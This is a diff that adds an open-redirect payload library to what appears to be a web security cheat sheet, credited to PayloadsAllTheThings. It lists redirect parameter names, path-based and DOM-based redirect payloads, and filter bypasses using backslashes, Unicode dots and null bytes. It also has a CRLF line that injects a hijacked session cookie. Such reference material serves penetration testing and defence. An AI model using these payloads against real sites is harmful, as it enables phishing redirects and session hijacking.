@@ -173,6 +173,104 @@ https://evil.com#target.com      # fragment doesn't affect destination
 # Newline injection (chains with CRLF):
 https://evil.com%0d%0aSet-Cookie:session=hijacked</code></pre>
 
+  <h2>Open Redirect Payload Library</h2>
+  <p>Extended payload collection from PayloadsAllTheThings covering all redirect methods.</p>
+
+  <h3>Path-Based Redirects</h3>
+  <pre><code># Redirect logic in URL path (not query param):
+https://example.com/redirect/http://malicious.com
+https://example.com/redirect/../http://malicious.com
+https://example.com/redirect/https://malicious.com
+/redirect/http://malicious.com
+/out/http://malicious.com</code></pre>
+
+  <h3>JavaScript-Based Redirects</h3>
+  <pre><code># If app uses window.location = variable:
+?redirectTo=http://malicious.com
+?redirectTo=//malicious.com
+?redirectTo=javascript:alert(document.domain)
+
+# DOM-based: if JS reads location.search and sets window.location:
+https://target.com/?next=//attacker.com
+# Check: does the page contain location.href=, location=, window.location=?</code></pre>
+
+  <h3>Complete Parameter List</h3>
+  <pre><code>?checkout_url={payload}
+?continue={payload}
+?dest={payload}
+?destination={payload}
+?go={payload}
+?image_url={payload}
+?next={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+?return_path={payload}
+?return_to={payload}
+?return={payload}
+?returnTo={payload}
+?rurl={payload}
+?target={payload}
+?url={payload}
+?view={payload}
+/{payload}
+/redirect/{payload}</code></pre>
+
+  <h2>URL Parser Bypass Techniques</h2>
+  <p>Advanced filter bypass techniques from PayloadsAllTheThings, covering all major WAF and filter patterns.</p>
+
+  <h3>Keyword Bypass</h3>
+  <pre><code># Bypass "http" keyword blacklist using double slash:
+//google.com
+////google.com
+
+# Bypass "//" blacklist:
+https:google.com
+
+# Bypass "//" with backslash:
+\/\/google.com/
+/\/google.com/
+
+# Bypass "javascript" using CRLF:
+java%0d%0ascript%0d%0a:alert(0)</code></pre>
+
+  <h3>Domain Confusion</h3>
+  <pre><code># @ character (browser authenticates to evil.com with target.com credentials):
+http://www.theirsite.com@yoursite.com/
+
+# Domain as path:
+http://www.yoursite.com/http://www.theirsite.com/
+http://www.yoursite.com/folder/www.folder.com
+
+# Whitelisted domain as subdomain of attacker:
+www.whitelisted.com.evil.com  # redirect to evil.com</code></pre>
+
+  <h3>Dot Bypass (Unicode)</h3>
+  <pre><code># Unicode dot bypass (bypass dot-blacklist):
+/?redir=google。com              # Japanese period (。)
+//google%E3%80%82com             # URL-encoded Japanese period
+
+# Null byte truncation:
+//google%00.com</code></pre>
+
+  <h3>HTTP Parameter Pollution</h3>
+  <pre><code># Last value wins (some frameworks):
+?next=whitelisted.com&amp;next=google.com
+
+# First value wins:
+?next=google.com&amp;next=whitelisted.com</code></pre>
+
+  <h3>Question Mark and Misc</h3>
+  <pre><code># Question mark — browser translates to /?:
+?url=https://evil.com?target.com
+
+# Fragment:
+?url=https://evil.com#target.com
+
+# Newline injection (chains with CRLF header injection):
+https://evil.com%0d%0aSet-Cookie:session=hijacked</code></pre>
+
   <h2>Resources</h2>
   <ul>
     <li>Oralyzer — open redirect scanner — <code>github.com/0xNanda/Oralyzer</code></li>
